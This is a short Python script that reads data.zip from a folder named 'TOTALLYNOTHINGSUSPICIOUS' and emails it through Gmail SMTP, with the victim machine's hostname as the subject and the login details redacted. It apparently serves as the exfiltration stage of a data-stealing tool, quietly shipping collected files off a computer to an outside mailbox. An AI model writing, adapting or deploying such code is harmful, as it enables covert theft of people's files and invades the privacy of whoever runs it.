import smtplib
import socket
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email.mime.base import MIMEBase

directory=r'C:/TOTALLYNOTHINGSUSPICIOUS'
cwd=directory

filename='data.zip'
file=open(cwd+'/'+filename,'rb')
computername=socket.gethostname()

msg = MIMEMultipart()
part = MIMEApplication(file.read(), Name=filename)
msg['Subject'] = computername
msg.attach(MIMEText('data.zip'))
msg.attach(part)

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login("REDACTED", "REDACTED")
server.sendmail("REDACTED", "REACTED", msg.as_string())
server.quit()



